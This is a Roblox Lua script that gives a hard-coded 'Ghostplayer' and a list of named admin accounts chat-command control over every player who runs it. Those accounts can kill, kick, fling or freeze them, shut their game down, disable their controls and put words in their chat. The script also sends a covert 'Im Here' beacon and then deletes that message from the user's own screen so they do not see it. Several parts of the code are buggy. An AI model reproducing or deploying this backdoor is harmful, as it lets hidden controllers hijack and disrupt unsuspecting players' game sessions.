Ghostplayer = "seth_ka123"
local Admins = {"Pxrple001","bestgamer_pogi24","EC_BOT1","FEWithoutEffort"}

--[[ Commands List ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

:showusers
:hideusers

:kill
:kill all
:freeze
:unfreeze
:kick 
:kick all
:exit
:exit all
:bring
:bring all
:disablecontrol
:enablecontrol
:laydown
:dance
:dance all
:walktome
:avoidbang
:fling
:jump
:sit
:say
:

]]------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


if not game:GetService("ReplicatedStorage"):FindFirstChild("Admin") then
   local String = Instance.new("StringValue")
   String.Parent = game:GetService("ReplicatedStorage")
   String.Name = "Admin"
   String.Archivable = true
   String.Value = ""


   ---Remove Name in Table Function
   local function RemoveUser(name)
    for key, value in pairs(UsersFound) do
      if value == name then
         UsersFound[key] = nil
      end
    end
   end
   ---


   ---Find Admin in List Table Function
   local function CheckAdmin(name)
    for key, value in pairs(Admins) do
      if value == name then
         return true
      end
    end
    return false
   end
   ---


   ---Find Index Of String Function
   local function FindIndex(Word, Letter, start)
    if start == nil then
       start = 1
    end
    local found_count = 0
    local index = 0
    repeat
      index += 1
      if Word:sub(index, index) == Letter then
         found_count += 1
      end
    until found_count == start or index == string.len(Word)
    return index
   end
   ---


   ---Count Character Count in a String Function
   local function CountCharacter(string, character)
    local count = 0
    for i = 1, #string do
      if string.sub(string, i, i) == character then
         count = count + 1
      end
    end
    return count
   end
   ---
   
   
   ---Send Message Function
   local function SendMessage(msg)
    if game:GetService("TextChatService").TextChannels.RBXGeneral then
       game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(msg)
    else
       game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
    end
   end
   ---


   ---Users Detector Operator
   local UsersFound = {}
   local ShowUsers = false
   game:GetService("RunService").RenderStepped:Connect(function()
   if ShowUsers == true then
      for i,v in pairs(game.Players:GetPlayers()) do
        if v.Character:FindFirstChild("HumanoidRootPart") and not v.Character.HumanoidRootPart:FindFirstChild("USER ESP") then
           for key, value in pairs(UsersFound) do
             if value == v.Name then
                local BillboardGui = Instance.new("BillboardGui")
                local TextLabel = Instance.new("TextLabel")
                local UICorner = Instance.new("UICorner") 
 
                BillboardGui.Parent = v.Character:FindFirstChild("HumanoidRootPart")
                BillboardGui.Name = "USER ESP"
                BillboardGui.AlwaysOnTop = true
                BillboardGui.LightInfluence = 0
                BillboardGui.Size = UDim2.new(0, 8, 0, 8)
                BillboardGui.StudsOffset = Vector3.new(0, 0, 0)

                TextLabel.Parent = BillboardGui
                TextLabel.BackgroundColor3 = Color3.new(1,1,1)
                TextLabel.BackgroundTransparency = 1
                TextLabel.Size = UDim2.new(1, 0, 1, 0)
                TextLabel.Text = v.Name
                TextLabel.TextColor3 = Color3.new(1,1,1)
                TextLabel.Visible = false
             end
           end
        end
      end
      for _, v in pairs(game.Players:GetPlayers()) do 
        if v.Character:FindFirstChild("HumanoidRootPart") and v.Character.HumanoidRootPart:FindFirstChild("USER ESP") and v.Character.HumanoidRootPart:FindFirstChild("USER ESP").TextLabel.Visible == false then
           v.Character.HumanoidRootPart:FindFirstChild("USER ESP").TextLabel.Visible = true
        end
      end
   end
   end)
   ---


   ---Execute Command Function
   local function ExecuteAdminCMD(admin)
    game.Players[admin.Name].Chatted:Connect(function(admin_msg)
    local MyName = game.Players.LocalPlayer.Name
    local MyDisplayName = game.Players.LocalPlayer.DisplayName
 
    if admin_msg:sub(1,1) ~= ":" then
       return
    end
    
    ---Only Admin Script
    if admin_msg == ":showusers" then
       ShowUsers = true
    elseif admin_msg == ":hideusers" then
       ShowUsers = false
       for _, v in pairs(game.Players:GetPlayers()) do 
         if v.Character.HumanoidRootPart:FindFirstChild("USER ESP") then
            v.Character.HumanoidRootPart:FindFirstChild("USER ESP").TextLabel.Visible = false
         end
       end
    end
    ---
    
    if string.find(admin_msg, " ") then
       if CountCharacter(admin_msg, " ") == 1 then
          local user = admin_msg:sub(FindIndex(admin_msg, " ") + 1, string.len(admin_msg))
          if string.find(MyName, user) or string.find(MyDisplayName, user) then
             MyName = user
          end
       else
          local user = admin_msg:sub(FindIndex(admin_msg, " ") + 1, FindIndex(admin_msg, " ", 2) - 1)
          if string.find(MyName, user) or string.find(MyDisplayName, user) then
             MyName = user
          end
       end
    end
    
    if admin_msg == ":kill "..MyName or admin_msg == ":kill "..MyDisplayName or admin_msg == ":kill all" and MyName ~= admin.Name and MyName ~= Ghostplayer then
       game.Players.LocalPlayer.Character.Head:Destroy()
    elseif admin_msg == ":freeze "..MyName or admin_msg == ":freeze "..MyDisplayName then
       game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
    elseif admin_msg == ":unfreeze "..MyName or admin_msg == ":unfreeze "..MyDisplayName then
       game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
    elseif string.find(admin_msg.." ", ":kick "..MyName) or string.find(admin_msg.." ", ":kick "..MyDisplayName) or string.find(admin_msg.." ", ":kick all".." ") and MyName ~= admin.Name and MyName ~= Ghostplayer then
       game.Players.LocalPlayer:Kick(admin_msg:sub(FindIndex(admin_msg, " ", 2) + 1, string.len(admin_msg)))
    elseif admin_msg == ":exit "..MyName or admin_msg == ":exit "..MyDisplayName or admin_msg == ":exit all" and MyName ~= admin.Name and MyName ~= Ghostplayer then
       game:Shutdown()
    elseif admin_msg == ":bring "..MyName or admin_msg == ":bring "..MyDisplayName or admin_msg == ":bring all" and MyName ~= admin.Name and MyName ~= Ghostplayer then
       game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = admin.Character.HumanoidRootPart.CFrame
    elseif admin_msg == ":disablecontrol "..MyName or admin_msg == ":disablecontrol "..MyDisplayName then
       controls = require(game:GetService("Players").LocalPlayer.PlayerScripts.PlayerModule):GetControls() controls:Disable()
    elseif admin_msg == ":enablecontrol "..MyName or admin_msg == ":enablecontrol "..MyDisplayName then
       controls = require(game:GetService("Players").LocalPlayer.PlayerScripts.PlayerModule):GetControls() controls:Enable()
    elseif admin_msg == ":laydown "..MyName or admin_msg == ":laydown "..MyDisplayName then
       game.Players.LocalPlayer.Character.Humanoid.Sit = true
       task.wait(0.1)
       game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.Angles(math.pi * 0.5, 0, 0)
       for _, v in ipairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
         v:Stop()
       end
    elseif admin_msg == ":dance "..MyName or admin_msg == ":dance "..MyDisplayName or admin_msg == ":dance all" and MyName ~= admin.Name and MyName ~= Ghostplayer then
       SendMessage("/e dance")
    elseif admin_msg == ":fling "..MyName or admin_msg == ":fling "..MyDisplayName then
       bambam = Instance.new("BodyThrust")
       bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
       bambam.Force = Vector3.new(999990,0,999990)
       bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position 
    elseif admin_msg == ":sit "..MyName or admin_msg == ":sit "..MyDisplayName then
       game.Players.LocalPlayer.Character.Humanoid.Sit = true
    elseif admin_msg == ":jump "..MyName or admin_msg == ":jump "..MyDisplayName then
       game.Players.LocalPlayer.Character.Humanoid.Jump = true
    elseif admin_msg == ":walktome "..MyName or admin_msg == ":walktome "..MyDisplayName then
       game.Players.LocalPlayer.Character.Humanoid:MoveTo(admin.Character:FindFirstChild("HumanoidRootPart").Position)
    elseif admin_msg == ":avoidbang "..MyName or admin_msg == ":avoidbang "..MyDisplayName then
       workspace.FallenPartsDestroyHeight = -1000
       local lastCFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
       game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(0, -500, 0))
       wait(0.7)
       game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = lastCFrame
       workspace.FallenPartsDestroyHeight = -500
    elseif string.find(admin_msg, ":say "..MyName.." ") or string.find(admin_msg, ":say "..MyDisplayName.." ") then
       SendMessage(admin_msg:sub(FindIndex(admin_msg, " ", 2) + 1, string.len(admin_msg)))
    elseif admin_msg == ":" and MyName ~= admin.Name and MyName ~= Ghostplayer then
       SendMessage("✅ Im Here ✅")
       wait(0.1)
       for i,v in pairs(game.CoreGui:GetDescendants()) do
         if v.ClassName == "TextLabel" and string.find(v.Text, "✅ Im Here ✅") or v.ClassName == "TextButton" and string.find(v.Text, "✅ Im Here ✅") then
            v.Parent:Destroy()
         end
       end
    end
    end)
   end
   ---

   for _, v in pairs(game.Players:GetPlayers()) do 
     if v.Name == Ghostplayer or CheckAdmin(v.Name) == true then
        ExecuteAdminCMD(v)
     else
       v.Chatted:Connect(function(msg)
       if msg == "✅ Im Here ✅" then
          table.insert(UsersFound, v.Name)
       end
       end)
    end
   end

   game.Players.PlayerAdded:Connect(function(plr)
   if plr.Name == Ghostplayer or CheckAdmin(plr.Name) == true then
      ExecuteAdminCMD(plr)
   else
      v.Chatted:Connect(function(msg)
      if msg == "✅ Im Here ✅" then
         table.insert(UsersFound, v.Name)
      end
      end)
   end
   end)
end
